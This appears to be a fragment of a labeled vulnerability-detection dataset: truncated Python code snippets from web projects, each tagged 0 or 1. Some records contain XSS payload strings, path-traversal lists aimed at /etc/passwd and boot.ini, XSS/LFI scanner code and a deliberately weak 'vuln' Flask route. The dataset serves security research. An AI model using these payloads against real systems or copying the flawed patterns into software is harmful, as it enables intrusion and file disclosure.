routes.extend(endpoints_webapp2.api_routes(endpoints_services)) routes.extend( endpoints_webapp2.api_routes(endpoints_services, base_path='/api') )", "label": 0}, {"snippet_id": 9120, "code": "/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index", "label": 1}, {"snippet_id": 49768, "code": " socketio=SocketIO(app) html=''' <div id=history></div> <script src=\"https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.1.1/socket.io.js\"></script> <script> ''' html=html+\"var socket=io.connect('http://{}:{}')", "label": 0}, {"snippet_id": 33572, "code": ".db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers", "label": 0}, {"snippet_id": 16683, "code": ".course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$", "label": 1}, {"snippet_id": 38395, "code": "(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post.comments: \t\t\tpost.comment_text=_('No comments yet') \t\telif post.comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse: \t", "label": 0}, {"snippet_id": 5559, "code": "\", \"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))\"> \"\"\", \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss');\">\"\"\", \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64", "label": 0}, {"snippet_id": 28449, "code": " action, **kwargs): \timport sql \timport http.cookies \tlog_path=get_config_var('main', 'log_path') \tlogin='' \t \tif not os.path.exists(log_path): \t\tos.makedirs(log_path) \t\t \ttry: \t\tIP=cgi.escape(os.environ", "label": 0}, {"snippet_id": 17232, "code": "+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history", "label": 0}, {"snippet_id": 23175, "code": "\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+", "label": 0}, {"snippet_id": 52440, "code": "'Page saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def new_node(request): response={'status': -1} node=json.loads(request.POST.get('node', '{}')) properties=NODES[node[", "label": 0}, {"snippet_id": 26467, "code": "/../../etc/passwd', '../../../../../../etc/passwd', '../../../../../../../etc/passwd', '../../../../../../../../etc/passwd', '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',", "label": 0}, {"snippet_id": 34287, "code": "\tself.set(\"doctype\", d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif key in d: \t\t\t\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing", "label": 0}, {"snippet_id": 38740, "code": ".__dict__.get(key, default) \t\t\telse: \t\t\t\tvalue=self.__dict__.get(key, default) \t\t\tif value is None and key not in self.ignore_in_getter \\ \t\t\t\tand key in(d.fieldname for d in self.meta.get_table_fields()): ", "label": 0}, {"snippet_id": 7525, "code": "<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"),", "label": 0}, {"snippet_id": 29670, "code": "\timport subprocess \tp=subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True) \tstdout, stderr=p.communicate() \toutput=stdout.splitlines() \t \treturn output", "label": 0}, {"snippet_id": 594, "code": " uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in", "label": 0}, {"snippet_id": 47194, "code": " admin=Admin(app, name=\"Test\") assert 'model' in record_adminview assert 'modelview' in record_adminview model=record_adminview.pop('model') view=record_adminview.pop('modelview') admin.add_view(view(model,", "label": 0}, {"snippet_id": 16031, "code": ".urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings", "label": 0}, {"snippet_id": 20085, "code": " self.num_processes !=1: substring=[ \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"", "label": 0}, {"snippet_id": 11195, "code": " an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec=self.test_dir / self.test_spec if self.serversonly: return \"\" cmd=[ \"DEFAULT_STORE={}\".format(self.default_store), \"SCREENSHOT_DIR", "label": 0}, {"snippet_id": 27547, "code": " main navigation.\"\"\" def __init__(self, name, href): self.name=name self.href=href class Handler(webapp2.RequestHandler): \"\"\"A superclass for all handlers. It contains many convenient methods.\"\"\" def is_cron", "label": 0}, {"snippet_id": 29154, "code": "(\"cp scripts/%s.\" % script) \t \tcommands=[ \"sudo chmod +x \"+tmp_config_path+script+\" && \" +tmp_config_path+script +\" PROXY=\" +proxy+ \t\t\t\t\" HAPROXY_PATH=\"+haproxy_dir +\" VERSION=\"+ver] \t \terror=str(upload", "label": 0}, {"snippet_id": 310, "code": ": if 'application/json' or 'text/plain'in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_method(url,method,headers,body,scanid=None): result=", "label": 1}, {"snippet_id": 3218, "code": "{\"scan_data\": post_vul_param+\" are vulnerable to XSS\"}}) def xss_http_headers(url,method,headers,body,scanid=None): temp_headers={} temp_headers.update(headers) xss_payloads=fetch_xss_payload() for payload", "label": 0}, {"snippet_id": 2646, "code": " api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers,", "label": 0}, {"snippet_id": 15268, "code": " than or equal to the number of available processors. verify_xss -when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"", "label": 0}, {"snippet_id": 3496, "code": ",headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result", "label": 0}, {"snippet_id": 447, "code": "(parsed_url+'/'+payload,\"GET\",headers) xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) logs.logging.info(\"%s is vulnerable to XSS\",url) if xss_request_url.text.find(payload)", "label": 1}, {"snippet_id": 7629, "code": "<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', ", "label": 1}, {"snippet_id": 30114, "code": " and serv is not None: \tcommands=[ \"sudo ip a |grep inet |egrep -v '::1' |awk '{ print $2 }' |awk -F'/' '{ print $1 }'\"] \tfunct.ssh_command(serv, commands, ip=\"1\") \t if form.getvalue('showif'): \tcommands", "label": 0}, {"snippet_id": 10769, "code": ".serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity", "label": 0}, {"snippet_id": 22484, "code": "'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9", "label": 0}, {"snippet_id": 14192, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url", "label": 0}, {"snippet_id": 48903, "code": " column, object): self.smart_list_item=smart_list_item self.column=column self.object=object def get_value(self): if self.column.render_function: return self.column.render_function(self.object) field=getattr", "label": 1}, {"snippet_id": 41269, "code": "\"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def", "label": 0}, {"snippet_id": 53001, "code": " coordinator.')) return render('editor/coordinator_editor.mako', request,{ 'coordinator_json': coordinator.json, 'credentials_json': json.dumps(credentials.credentials.keys()), 'workflows_json': json.dumps", "label": 1}, {"snippet_id": 529, "code": " fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip(", "label": 0}, {"snippet_id": 2880, "code": ".parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if", "label": 0}, {"snippet_id": 52026, "code": " Submission from oozie.decorators import check_document_access_permission, check_document_modify_permission from oozie.forms import ParameterForm from oozie.models2 import Node, Workflow, Coordinator, Bundle", "label": 0}, {"snippet_id": 49434, "code": " self.field_name=field.parameter_name self.model_field=field else: self.field_name=field self.model_field=self.model._meta.get_field(self.field_name) self.query_params=query_params self.object_list=object_list", "label": 0}, {"snippet_id": 29149, "code": ".get_setting('haproxy_dir') \tver=check_haproxy_version(serv) \tos.system(\"cp scripts/%s.\" % script) \t \tcommands=[ \"sudo chmod +x \"+tmp_config_path+script+\" && \" +tmp_config_path+script +\" PROXY=\" +proxy+ \t\t\t", "label": 0}, {"snippet_id": 11411, "code": "{zipped_course} -C{courses_dir}'.format( zipped_course=zipped_course, courses_dir=self.imports_dir, ) ) def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler json", "label": 0}, {"snippet_id": 26826, "code": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini' ] lfi_expect=['[operating systems]', '[boot loader]', '", "label": 0}, {"snippet_id": 25982, "code": "', 'country', 'vat_id', 'internal_reference', 'beneficiary') widgets={ 'is_business': BusinessBooleanRadio, 'street': forms.Textarea(attrs={'rows': 2, 'placeholder': _('Street and Number')}), 'beneficiary", "label": 0}, {"snippet_id": 38624, "code": "._meta=frappe.get_meta(self.doctype) \t\treturn self._meta \tdef update(self, d): \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif key in d: \t\t\t\tself.set", "label": 0}, {"snippet_id": 55066, "code": "): return HttpResponseBadRequest(form.errors.as_json()) locale=get_object_or_404(Locale, code=form.cleaned_data['locale']) entities=Entity.objects.filter(pk__in=form.cleaned_data['entities']) if not entities", "label": 1}, {"snippet_id": 46404, "code": ".objects.get(id=collection['id']) else: dashboard_doc=Document2.objects.create(name=collection['name'], uuid=collection['uuid'], type='search-dashboard', owner=request.user, description=collection['label'])", "label": 0}, {"snippet_id": 19295, "code": "('', test_spec=spec, default_store='draft') name='tests/{}'.format(spec) self.assertEqual( suite.cmd, self._expected_command(name=name, store='draft') ) def test_invalid_default_store(self): suite=BokChoyTestSuite", "label": 0}, {"snippet_id": 16536, "code": ", include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url", "label": 0}, {"snippet_id": 49858, "code": " def root(): return render_template(\"home.html\") @app.route(\"/interact\", methods=[\"POST\"]) def vuln(): msg=request.form[\"message\"].replace('img', 'uwu').replace('location', 'owo').replace('script', 'uwu", "label": 1}, {"snippet_id": 42565, "code": "\t\t\t\tself.show_unique_validation_message(e) \t\t\telse: \t\t\t\traise \tdef show_unique_validation_message(self, e): \t\ttype, value, traceback=sys.exc_info() \t\tfieldname, label=str(e).split(\"'\")[-2], None \t\t \t\t ", "label": 0}, {"snippet_id": 27891, "code": ", self.response.headers.get('Content-Type')): self.render_json(values, 500) else: self.render('error.html', values, 500) def redirect(self, url, **kwargs): \"\"\"Explicitly converts url to 'str', because webapp2", "label": 0}, {"snippet_id": 47017, "code": "] @comment_reacted.connect async def update_comment_list_cache(_, user_id, comment_id): comment=await Comment.cache(comment_id) if comment: asyncio.gather( clear_mc(MC_KEY_COMMENT_LIST % comment.post_id", "label": 0}, {"snippet_id": 47933, "code": ", email=mail, password=pw1) auth_user.save() user: Profile=Profile() user.rights=rights user.number_of_allowed_reservations=int(request.POST[\"allowed_reservations\"]) user.displayName=displayname user.authuser", "label": 1}, {"snippet_id": 6955, "code": ", name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name", "label": 0}, {"snippet_id": 36522, "code": "],{} \tif not data: \t\treturn out \t \tif filters: \t\tfor f in filters: \t\t\tfval=filters[f] \t\t\tif not isinstance(fval,(tuple, list)): \t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False:", "label": 0}, {"snippet_id": 47057, "code": " markupsafe import Markup from sqlalchemy.exc import SQLAlchemyError from.api import Record from.models import RecordMetadata class RecordMetadataModelView(ModelView): \"\"\"Records admin model view.\"\"\" filter_converter", "label": 0}, {"snippet_id": 13816, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/", "label": 0}, {"snippet_id": 6901, "code": " similar on localhost that will proxy requests to a currently available backend using TLS. \"\"\" return self.config.get(self.section, 'vccs_url') @property def insecure_cookies(self): \"\"\" Set to True to NOT", "label": 0}, {"snippet_id": 48090, "code": "'wb+') as destination: for chunk in file.chunks(): destination.write(chunk) original=Image.open(high_res_file_name) width, height=original.size diameter=math.sqrt(math.pow(width, 2) +math.pow(height, 2", "label": 0}, {"snippet_id": 54434, "code": ").grid(row=11, column=4, sticky=W, pady=4) Label(main, text=\"\\n\\nCoder: Ala Bouali\\nGithub: https://github.com/AlaBouali\\nE-mail: trap.leader.123@gmail.com\\n\\nDisclaimer:\\nThis tool is for educational purposes", "label": 0}, {"snippet_id": 50498, "code": ".args.get('csessid')[0] try: sess=self.sessionhandler.sessions_from_csessid(csessid)[0] sess.sessionhandler.disconnect(sess) except IndexError: self.client_disconnect(csessid) return '\"\"' def render_POST", "label": 0}, {"snippet_id": 47286, "code": ".RecordMetadata') as db_mock: db_mock.side_effect=SQLAlchemyError() res=client.post( delete_view_url, data={'id': rec_uuid}, follow_redirects=True) assert res.status_code==200 res=client.post( delete_view_url,", "label": 0}, {"snippet_id": 27844, "code": " status==403 or status==401: self.render_forbidden(exception.message) else: self.render('error.html', values, status) except Exception: self.handle_exception_exception() def handle_exception_exception(self):", "label": 0}, {"snippet_id": 54379, "code": "=30) payload.grid(row=5, column=1) payload.config(width=30) proxy.grid(row=6, column=1) proxy.current(0) proxy.config(width=30) refresh.grid(row=7, column=1) refresh.current(1) refresh.config(width=30)", "label": 0}, {"snippet_id": 51350, "code": "'name', 'account',) search_fields=('name', 'account__name') list_filter=['account'][::-1] fields=('name', 'account', 'urls') @admin.register(UploadLog) class UploadLogAdmin(ImportExportModelAdmin, admin", "label": 0}, {"snippet_id": 48465, "code": "\"\" This function is used to submit the reservation \"\"\" u: Profile=get_current_user(request) forward_url=\"/admin?success\" if u.rights > 0: forward_url=\"/admin/reservations\" if request.GET.get(\"redirect\"", "label": 0}, {"snippet_id": 23628, "code": "/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT", "label": 0}, {"snippet_id": 41337, "code": "(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None", "label": 0}, {"snippet_id": 43730, "code": " a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2\"] \t\t:param fieldname: Fieldname to be checked if hidden. \t\t\"\"\" \t\tmeta_df=self", "label": 0}, {"snippet_id": 51275, "code": "*args, **kwargs) class ConfigAdmin(ConstanceAdmin): change_list_form=CustomConfigForm change_list_template='admin/config/settings.html' admin.site.unregister([Config]) admin.site.register([Config], ConfigAdmin", "label": 0}, {"snippet_id": 1663, "code": " to parse\" print \"Data\",data try: if data['id']==\"NA\": all_data={'url': data['url'], 'impact': data['impact'], 'name': data['name'], 'req_headers': data['req_headers'], 'req_body': data['req_body'], 'res_headers", "label": 0}, {"snippet_id": 23740, "code": " \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js'", "label": 0}, {"snippet_id": 47847, "code": ".dect=dect user.notes=notes user.rights=rights user.number_of_allowed_reservations=int(request.POST[\"allowed_reservations\"]) if request.POST.get(\"active\"): user.active=magic.parse_bool(request.POST[\"active", "label": 1}, {"snippet_id": 31558, "code": " orient=\"index\") \t\tdf=df.fillna(0) \t\tdf.index=pd.to_datetime(df.index) \t\tdf.index.name='Date' \t\tdf.sort_index(inplace=True) \t\tsource=ColumnDataSource(df) \t\t \t\toutput_file(\"templates/metrics_waf_out.html\",", "label": 0}, {"snippet_id": 27173, "code": " m_value: hidden_param_name.append(m_input.group(2)) hidden_param_value.append(m_value.group(2)) else: params.append(m_input.group(2)) m_same =re.match(r'.*\\<form\\>\"', line, re.M|re.I) m_action =re.match", "label": 1}, {"snippet_id": 42771, "code": " not self.get(fieldname): \t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname)))) \t\treturn missing \tdef get_invalid_links(self, is_submittable=False): \t\t'''Returns list of invalid links", "label": 0}, {"snippet_id": 16714, "code": "+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted')", "label": 1}, {"snippet_id": 44800, "code": " script_path=node_data.get('properties',{}).get('script_path',{}) if script_path: script_path=script_path.replace('hdfs://', '') if request.fs.do_as_user(request.user, request.fs.exists, script_path): data", "label": 0}, {"snippet_id": 32726, "code": " raise def _DoRawSourceFile(self, full_path): self._WriteHeader('text/html') self._WriteTemplate('header.html') self.wfile.write('<table class=\"FileContents\">') with open(full_path) as fp: data=fp.read", "label": 0}, {"snippet_id": 19733, "code": ": text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below is a subset): test_dir -parent directory for", "label": 0}, {"snippet_id": 39408, "code": ".get(\"__islocal\") or not self.name: \t\t\tself.db_insert() \t\t\treturn \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\t \t\tname=d['name'] \t\tdel d['name'] \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"update", "label": 0}, {"snippet_id": 32274, "code": ".add_argument('file', nargs='?', help='open file in browser') args=parser.parse_args(argv) top_level=os.path.realpath(args.directory) hostname='0.0.0.0' if args.external else 'localhost' server_address=(hostname", "label": 0}, {"snippet_id": 13492, "code": "(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern", "label": 0}, {"snippet_id": 20426, "code": "\"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url", "label": 0}, {"snippet_id": 39189, "code": "): \t\treturn self.get(\"__islocal\") \tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False): \t\tdoc=self.get_valid_dict(convert_dates_to_str=convert_dates_to_str) \t\tdoc[\"doctype", "label": 0}, {"snippet_id": 1646, "code": ",data if data['req_body']==None: data['req_body']=\"NA\" data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) except: print \"Falied to parse\" print \"Data\",data try: if data['id']==\"NA\": all_data={", "label": 0}, {"snippet_id": 22849, "code": "]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*", "label": 1}, {"snippet_id": 7023, "code": ", url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name", "label": 0}, {"snippet_id": 48085, "code": " open(high_res_file_name, 'wb+') as destination: for chunk in file.chunks(): destination.write(chunk) original=Image.open(high_res_file_name) width, height=original.size diameter=math.sqrt(math.pow(width", "label": 0}, {"snippet_id": 22351, "code": "[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r", "label": 0}, {"snippet_id": 49580, "code": " search_query_param=None, ordering_query_param=None): self.object_list=object_list self.model=object_list.model self.query_params=query_params or{} self.list_display=list_display or[] self.list_filter=list_filter or[]", "label": 0}, {"snippet_id": 17949, "code": " 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$'", "label": 0}, {"snippet_id": 34016, "code": "\t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image", "label": 0}, {"snippet_id": 49673, "code": "=[] for index, field in enumerate(self.list_display, start=1): kwargs={ 'model': self.model, 'column_id': index, 'query_params': self.query_params, 'ordering_query_param': self.ordering_query_param, } try", "label": 0}, {"snippet_id": 12351, "code": "/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views", "label": 0}, {"snippet_id": 26743, "code": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00', '../../../../../boot.ini%00', '../../../../../../boot.ini%00', '../../.", "label": 0}, {"snippet_id": 21604, "code": ".take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>", "label": 0}, {"snippet_id": 42858, "code": ".options) \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[ \t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch", "label": 0}, {"snippet_id": 40522, "code": ", \"Float\", \"Percent\"): \t\t\t\tself._precision[cache_key][fieldname]=get_field_precision(df, self) \t\treturn self._precision[cache_key][fieldname] \tdef get_formatted(self, fieldname, doc=None, currency=None", "label": 0}, {"snippet_id": 34994, "code": "\t\t\t\tcolumns=\", \".join([\"`\"+c+\"`\" for c in columns]), \t\t\t\t\tvalues=\", \".join([\"%s\"] * len(columns)) \t\t\t\t), list(d.values())) \t\texcept Exception as e: \t\t\tif e.args[0]==1062: \t\t\t\tif \"PRIMARY\" in cstr(e.args", "label": 0}, {"snippet_id": 29588, "code": " kwargs.get('print_out'): \t\t\tprint(stdout.read().decode(encoding='UTF-8')) \t\t\treturn stdout.read().decode(encoding='UTF-8') \t\telif kwargs.get('retunr_err')==1: \t\t\treturn stderr.read().decode(encoding='UTF", "label": 0}, {"snippet_id": 7080, "code": "', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r", "label": 0}, {"snippet_id": 51980, "code": " formset_factory from django.http import HttpResponse from django.shortcuts import redirect from django.utils.translation import ugettext as _ from desktop.lib.django_util import render from desktop.lib", "label": 0}, {"snippet_id": 20776, "code": "(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper", "label": 0}, {"snippet_id": 6162, "code": "']) self.config=ConfigParser.ConfigParser(_CONFIG_DEFAULTS) if not self.config.read([filename]): raise ValueError(\"Failed loading config file{!r}\".format(filename)) @property def num_threads(self): \"\"\"", "label": 0}, {"snippet_id": 33741, "code": "\t\ttitle=_('Blog') \t) \tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed", "label": 1}, {"snippet_id": 33445, "code": "\t\t\t\treturn _payload \tdef check(self, url, payload, response, parameter): \t\tfor injection_types in self.signatures.keys(): \t\t\tfor sig in self.signatures[injection_types]: \t\t\t\tmatch=re.findall(re.escape(sig", "label": 1}, {"snippet_id": 35651, "code": ".in_import or self.is_new() or self.flags.ignore_validate_constants: \t\t\treturn \t\tconstants=[d.fieldname for d in self.meta.get(\"fields\",{\"set_only_once\":('=',1)})] \t\tif constants: \t\t\tvalues=frappe.db.get_value", "label": 0}, {"snippet_id": 47078, "code": "=False can_delete=True can_view_details=True column_list=('id', 'version_id', 'updated', 'created',) column_details_list=('id', 'version_id', 'updated', 'created', 'json') column_labels=dict( id=_('UUID'", "label": 0}, {"snippet_id": 18087, "code": "<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license", "label": 0}, {"snippet_id": 17797, "code": "( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', ", "label": 0}, {"snippet_id": 43830, "code": "> 0, then reset the values to original / default\"\"\" \t\tto_reset=[] \t\tfor df in high_permlevel_fields: \t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes: \t\t\t\tto_reset.append", "label": 0}, {"snippet_id": 19461, "code": "{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite", "label": 0}, {"snippet_id": 30201, "code": "\tfunct.ssh_command(serv, commands)\t\t \t if act==\"overview\": \tovw.get_overview() \t if act==\"overviewwaf\": \tovw.get_overviewWaf(form.getvalue('page')) \t if act==\"overviewServers\": \tovw.get_overviewServers() ", "label": 0}, {"snippet_id": 13313, "code": "/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if", "label": 0}, {"snippet_id": 46410, "code": "(name=collection['name'], uuid=collection['uuid'], type='search-dashboard', owner=request.user, description=collection['label']) Document.objects.link(dashboard_doc, owner=request.user, name=collection", "label": 0}, {"snippet_id": 42280, "code": "\telse: \t\t\t\tvalid=self.meta.get_valid_columns() \t\t\tfrappe.local.valid_columns[self.doctype]=valid \t\treturn frappe.local.valid_columns[self.doctype] \tdef is_new(self): \t\treturn self.get(\"__islocal\") \tdef", "label": 0}, {"snippet_id": 54098, "code": " x in crl: if stop==True: break print(\"[*]URL:{}\".format(x)) 